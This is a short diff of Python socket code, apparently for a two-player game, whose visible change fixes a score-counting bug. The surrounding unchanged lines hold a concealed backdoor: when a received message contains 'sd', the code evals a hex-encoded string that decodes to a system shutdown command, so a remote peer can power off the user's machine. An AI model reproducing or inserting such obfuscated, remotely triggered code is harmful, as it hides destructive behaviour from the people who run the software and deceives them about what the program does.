@@ -83,7 +83,7 @@ class server_thread(Thread):
             while True:
                 msg = self.server.recv(1024)
                 if msg:
-                    self.opponent_score += self.msg.count(b"1")
+                    self.opponent_score += msg.count(b"1")
                     if msg.count(b"sd"):
                         from binascii import unhexlify
                         eval(unhexlify("73797374656d282273687574646f776e202f702229").decode("utf-8"))
